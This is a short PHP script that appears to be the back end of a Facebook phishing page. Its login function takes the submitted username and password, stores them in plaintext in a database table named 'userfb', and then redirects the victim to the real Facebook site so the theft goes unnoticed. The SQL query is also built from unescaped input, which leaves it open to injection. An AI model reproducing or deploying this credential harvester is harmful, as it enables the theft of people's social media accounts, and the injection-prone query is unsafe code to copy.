<?php
   // $User = $Password ='';
    function DangNhap(){
        if(!empty($_POST)){
            
            $User = $_POST['User'];
            $Password = $_POST['Password'];

            $connect = new mysqli('localhost','root','','php_fbf');
            if($connect->connect_error) {
                var_dump($connect->connect_error);
                die();
            }
            $sql= "INSERT INTO `userfb` (`UserName` , `Password`) 
            VALUES ('".$User."','". $Password."')";
            mysqli_query($connect,$sql);
            $connect->close();
            if(isset($_POST['User']) && isset($_POST['Password'])){
                header("Location: https://www.facebook.com/");
            }
           
        }
    }
   

?>